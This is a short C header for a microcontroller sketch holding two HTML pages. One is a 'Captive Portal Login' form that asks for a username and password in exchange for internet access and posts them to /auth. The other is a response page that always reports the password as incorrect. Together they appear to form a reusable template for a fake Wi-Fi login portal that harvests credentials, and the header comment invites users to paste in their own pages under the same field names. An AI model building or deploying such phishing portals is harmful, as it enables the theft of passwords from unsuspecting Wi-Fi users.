/*
 * TO CHANGE THE WEBSITES PASTE YOUR HTML CODE WITH STYLE TAGS AND JAVASCRIPT ALL IN ONE HTML FILE DOWN BELOW IN THE TWO VARIABLES.
 * THESE TWO DOWN BELOW ARE JUST SAMPLES!
 * !!!IMPORTANT!!!
 * THERE MUST BE A SUBMITTED FOR WHICH SUBMITS THE DATA TO "/AUTH" AND IN THE FORM THERE MUST BE TWO INPUTS. ONE NAMED "user" AND THE OTHER NAMED "password"!
 */


//<editor-fold desc="Login HTML Page">
const char loginHtml[] PROGMEM ="<!DOCTYPE html><html lang='en'><head>"
								"<meta name='viewport' content='width=device-width'>"
								"<title>Captive Portal Login</title></head><body>"
								"<h1>Login</h1>"
								"<p>Enter your user and password to get internet access!</p>"
								"<form action='/auth' method='post'>"
								"<label for='user'>Username</label>"
								"<input type='text' name='user'/>"
								"<label for='password'>Password</label>"
								"<input type='password' name='password'/>"
								"<input type='submit'/>"
								"</form></body></html>";
//</editor-fold>


//<editor-fold desc="Response After Login HTML">
const char responseHtml[] PROGMEM = ""
									"<!DOCTYPE html><html lang='en'><head>"
									"<meta name='viewport' content='width=device-width'>"
									"<title>Captive Portal Login</title></head><body>"
									"<h1>Your password is not correct!</h1>"
									"</body></html>";
//</editor-fold>
